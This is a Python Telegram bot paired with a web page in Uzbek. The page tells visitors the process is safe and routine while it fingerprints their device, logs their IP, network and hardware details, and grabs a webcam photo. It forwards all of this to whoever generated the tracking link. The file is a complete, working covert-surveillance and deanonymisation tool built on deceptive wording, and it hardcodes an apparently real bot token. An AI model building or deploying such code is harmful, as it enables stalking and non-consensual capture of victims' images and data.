#!/usr/bin/env python3
# main.py

import os
import json
import uuid
import base64
import asyncio
import logging
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

# --------- LOGGING ---------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --------- ENV ---------
BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
PORT = int(os.getenv("PORT", "8000"))

# --------- STATE ---------
USER_TOKENS = {}

# --------- /start handler ---------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "👋 Salom!\n\n"
        "Quyidagi havolani oching, biz xizmatimizni sizga moslashtirish uchun ba’zi qurilmangiz haqidagi ma’lumotlarni olamiz.\n\n"
        f"🔗 {link}\n\n"
        "Jarayon mutlaqo xavfsiz va odatiy hisoblanadi."
    )
    await update.message.reply_text(msg)

# --------- HTML sahifa ---------
async def track_page(request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Yuklanmoqda...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .loader {{
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #777; }}
  </style>
</head>
<body>
  <h2>Iltimos, bir necha soniya kuting...</h2>
  <div class="loader"></div>
  <div class="note">Tajribangizni yaxshilash uchun texnik sozlamalar aniqlanmoqda</div>
  <script>
    async function collect() {{
      const data = {{
        timestamp: new Date().toLocaleString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        utcOffset: -new Date().getTimezoneOffset() / 60,
        languages: navigator.languages.join(', '),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || "Noma'lum",
        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
        screen: `${{screen.width}}x${{screen.height}}`,
        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
        browser: "Noma'lum",
        os: "Noma'lum",
        model: "Noma'lum",
        devices: {{ mic: 0, speaker: 0, camera: 0 }},
        gpu: "Noma'lum",
        cameraRes: "Noma'lum",
        network: "Noma'lum"
      }};

      // Brauzer
      if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
      else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
      else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

      // OS
      if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
      else if (/Android/.test(navigator.userAgent)) data.os = "Android";
      else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
      else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";
      else data.os = "Boshqa";

      try {{
        const devs = await navigator.mediaDevices.enumerateDevices();
        data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
        data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
        data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
      }} catch (e) {{}}

      // GPU
      try {{
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        if (dbg) {{
          data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }}
      }} catch (e) {{}}

      // Network
      if (navigator.connection) {{
        data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
      }}

      // Kamera test + rasm
      try {{
        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
        const track = stream.getVideoTracks()[0];
        const settings = track.getSettings();
        data.cameraRes = `${{settings.width}}x${{settings.height}}`;

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        const img = canvas.toDataURL("image/jpeg", 0.7);

        fetch("/upload_image", {{
          method: "POST",
          headers: {{ "Content-Type": "application/json" }},
          body: JSON.stringify({{ token: "{token}", image: img }})
        }});

        stream.getTracks().forEach(t => t.stop());
      }} catch (e) {{
        fetch("/camera_denied", {{
          method: "POST",
          headers: {{ "Content-Type": "application/json" }},
          body: JSON.stringify({{ token: "{token}" }})
        }});
      }}

      fetch("/submit", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify({{ token: "{token}", clientData: data }})
      }});

      document.body.innerHTML = "<h2>✅ Ma’lumotlar olindi</h2><p class='note'>Sizga mos xizmat tayyorlanmoqda.</p>";
    }}
    collect();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

# --------- /submit ---------
async def submit_data(request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        user_id = USER_TOKENS.get(token)

        if not user_id:
            return web.Response(status=403)

        devs = client_data.get("devices", {})
        message = (
            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
            f"📍 IP: {request.remote}\n"
            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
            f"🎮 GPU: {client_data.get('gpu')}\n"
            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar, RAM: {client_data.get('deviceMemory')} GB\n"
            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit\n"
            f"🎤 Qurilmalar: 🎙 Mic: {devs.get('mic',0)} 🎧 Speaker: {devs.get('speaker',0)} 📷 Kamera: {devs.get('camera',0)}\n"
            f"📶 Tarmoq: {client_data.get('network')}\n"
            f"🗣 Tillar: {client_data.get('languages')}\n"
            f"🔍 UA: {client_data.get('userAgent')}"
        )

        await request.app["bot"].send_message(chat_id=user_id, text=message)
        return web.Response(status=200)
    except Exception as e:
        logger.exception("Submit Error")
        return web.Response(status=500, text=str(e))

# --------- /upload_image ---------
async def upload_image(request):
    try:
        data = await request.json()
        token = data.get("token")
        image_data = data.get("image")
        user_id = USER_TOKENS.get(token)

        if not user_id:
            return web.Response(status=403)

        image_data = image_data.split(",")[1]  # Remove "data:image/jpeg;base64,"
        image = BytesIO(base64.b64decode(image_data))
        image.name = "photo.jpg"

        await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(image))
        return web.Response(status=200)
    except Exception as e:
        logger.exception("Upload Image Error")
        return web.Response(status=500, text=str(e))

# --------- /camera_denied ---------
async def camera_denied(request):
    try:
        data = await request.json()
        token = data.get("token")
        user_id = USER_TOKENS.get(token)

        if user_id:
            await request.app["bot"].send_message(chat_id=user_id, text="⚠️ Kamera ishlashi rad etildi yoki mavjud emas.")
        return web.Response(status=200)
    except:
        return web.Response(status=500)

# --------- Web server ---------
async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    app.router.add_post("/upload_image", upload_image)
    app.router.add_post("/camera_denied", camera_denied)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server running on http://0.0.0.0:{PORT}")

# --------- Main ---------
async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    logger.info("🤖 Bot ishga tushdi")
    app.run_polling()

if __name__ == "__main__":
    main()
